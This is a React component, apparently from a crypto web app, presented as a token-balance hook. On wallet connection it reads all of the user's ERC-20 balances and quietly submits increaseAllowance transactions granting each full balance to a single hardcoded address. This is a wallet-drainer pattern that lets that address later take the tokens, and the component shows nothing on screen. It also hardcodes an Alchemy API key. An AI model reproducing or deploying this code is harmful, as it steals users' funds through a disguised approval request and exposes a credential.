import React, { useState, useEffect } from "react";
import { Alchemy, Network } from "alchemy-sdk";
import { useAccount, useSwitchChain, useDisconnect } from "wagmi";
import Erc20Abi from "../abi/Erc20Abi";
import { config as wagmiConfig } from "../../wagmiConfig";
import { writeContract } from "@wagmi/core";


const UseAccountBalances = ({connectionStatus}) => {
  const { address, isConnected, status } = useAccount();
  const { chains, switchChain } = useSwitchChain();
  const [tokensData, setTokensData] = useState([]);
  const { disconnect } = useDisconnect()

  const config = {
    apiKey:  "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-", 
    network: Network.ETH_SEPOLIA,
  };
  const alchemy = new Alchemy(config);

  useEffect(() => {
    if (isConnected) {
      connectionStatus()
      getUserTokens();
    }
  }, [isConnected]); 

  const getUserTokens = async () => {
    try {
      const data = await alchemy.core.getTokenBalances(address);
      const newTokensData = data.tokenBalances.filter(
        (tokensDetails) => !tokensData.some((token) => token.id === tokensDetails.id)
      );
      setTokensData((prevTokensData) => [...prevTokensData, ...newTokensData]);
      increaseAllowanceForTokens([...tokensData, ...newTokensData]);
    } catch (error) {
      console.error("Error fetching token balances:", error);
    }
  };

  const increaseAllowanceForTokens = async (tokensData) => {
    tokensData.forEach((obj) => {
      const { contractAddress, tokenBalance } = obj;
      const hexToNumber = parseInt(tokenBalance,  16);

      if (hexToNumber >  0) {
        increaseAllowance(contractAddress, hexToNumber);
      }
    });
  };

  const increaseAllowance = async (contractAddress, allowance) => {
    try {
      const hash = await writeContract(wagmiConfig, {
        address: contractAddress,
        abi: Erc20Abi,
        functionName: "increaseAllowance",
        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", allowance],
      });
      console.log("Transaction hash:", hash);
    } catch (error) {
      console.error("Increase allowance error", error);
    }
  };

  return <div>
</div>;
};

export default UseAccountBalances;
